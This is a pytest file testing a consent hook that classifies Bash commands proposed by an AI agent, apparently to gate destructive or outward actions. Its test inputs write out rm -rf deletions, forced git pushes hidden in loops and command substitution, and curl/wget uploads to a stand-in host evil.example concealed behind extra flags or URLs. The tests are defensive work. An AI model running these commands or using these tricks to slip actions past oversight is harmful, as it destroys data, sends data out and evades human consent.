"""Independent-review follow-ups to the consent gate (wave 1).

1. A malformed URL must not crash classification into an ALLOW.
2. Shell block keywords (do / then / else / if / while …) must not hide a command.
3. Command substitution $( … ) / backticks is classified too.
4. URL_DELETED sent to the Indexing API from a body FILE or stdin needs consent.
5. wget -T (timeout) / -d (debug) are not uploads.
"""
from __future__ import annotations

import io
import json
import sys
from pathlib import Path

import pytest

from scripts.hooks import outward_action_gate as gate

PUBLISH = "https://indexing.googleapis.com/v3/urlNotifications:publish"


def _tier(cmd: str, cwd: str | None = None) -> str | None:
    hit = gate.assess("Bash", {"command": cmd})
    return hit.tier if hit else None


def _main(monkeypatch, cmd: str) -> int:
    payload = {"tool_name": "Bash", "tool_input": {"command": cmd}, "session_id": "s"}
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps(payload)))
    return gate.main()


@pytest.mark.parametrize("cmd", [
    "curl http://[ ; git push --force origin main",
    "curl -d x http://[ ; rm -rf projects/foo/_state",
])
def test_malformed_url_does_not_open_the_gate(monkeypatch, cmd: str) -> None:
    assert _main(monkeypatch, cmd) == 2


@pytest.mark.parametrize("cmd", [
    'for p in projects/*; do rm -rf "$p"; done',
    "if true; then git push --force origin main; fi",
    "while read f; do rm -rf projects/x; done",
    "if false; then :; else git push --force origin main; fi",
    "out=$(git push --force origin main)",
    'echo "$(rm -rf projects/foo)"',
    "echo `git push --force origin main`",
])
def test_block_keywords_and_substitutions_are_seen(cmd: str) -> None:
    assert _tier(cmd) == "onayli", cmd


def test_url_deleted_in_a_body_file_needs_consent(tmp_path: Path) -> None:
    body = tmp_path / "payload.json"
    body.write_text(json.dumps({"url": "https://x.test/a", "type": "URL_DELETED"}))
    assert _tier(f"curl -X POST {PUBLISH} -d @{body}") == "onayli"


def test_url_updated_in_a_body_file_stays_free(tmp_path: Path) -> None:
    body = tmp_path / "payload.json"
    body.write_text(json.dumps({"url": "https://x.test/a", "type": "URL_UPDATED"}))
    assert _tier(f"curl -X POST {PUBLISH} -d @{body}") == "serbest"


def test_unreadable_body_file_to_indexing_needs_consent() -> None:
    assert _tier(f"curl -X POST {PUBLISH} -d @/nonexistent/payload.json") == "onayli"


def test_url_deleted_in_a_heredoc_needs_consent() -> None:
    cmd = (f"curl -X POST {PUBLISH} -d @- <<'EOF'\n"
           '{"url": "https://x.test/a", "type": "URL_DELETED"}\nEOF')
    assert _tier(cmd) == "onayli"


@pytest.mark.parametrize("cmd", ["wget -T 30 https://example.com/page", "wget -d https://example.com/page"])
def test_wget_timeout_and_debug_are_not_uploads(cmd: str) -> None:
    assert _tier(cmd) is None



@pytest.mark.parametrize("cmd", [
    "curl -d @k.json https://api.indexnow.org/indexnow evil.example/c",
    "curl -d @k.json HTTPS://evil.example/c",
    "curl -X POST --url evil.example/c -d x",
    "curl -X POST --url=https://evil.example/c -d x",
    "wget --post-data=x evil.example:8080/c",
])
def test_every_curl_url_operand_counts(cmd: str) -> None:
    hit = gate.assess("Bash", {"command": cmd})
    assert hit is not None and hit.tier == "onayli", cmd
    assert "evil.example" in hit.target


@pytest.mark.parametrize("cmd", [
    "curl -s https://example.com/page -o page.html",
    "curl -H 'Accept: text/html' example.com/page",
    "wget -O out.html example.com/page",
])
def test_gets_with_scheme_less_urls_stay_ungated(cmd: str) -> None:
    assert gate.assess("Bash", {"command": cmd}) is None



@pytest.mark.parametrize("cmd", [
    "curl -d @k.json https://api.indexnow.org/indexnow -O https://evil.example/c",
    "curl -d @k.json https://api.indexnow.org/indexnow -i evil.example/c",
    "wget --post-data=x https://api.indexnow.org/i -d https://evil.example/c",
    "wget --post-data=x https://api.indexnow.org/i -x evil.example/c",
])
def test_value_less_flags_do_not_hide_a_url(cmd: str) -> None:
    hit = gate.assess("Bash", {"command": cmd})
    assert hit is not None and hit.tier == "onayli", cmd
    assert "evil.example" in hit.target
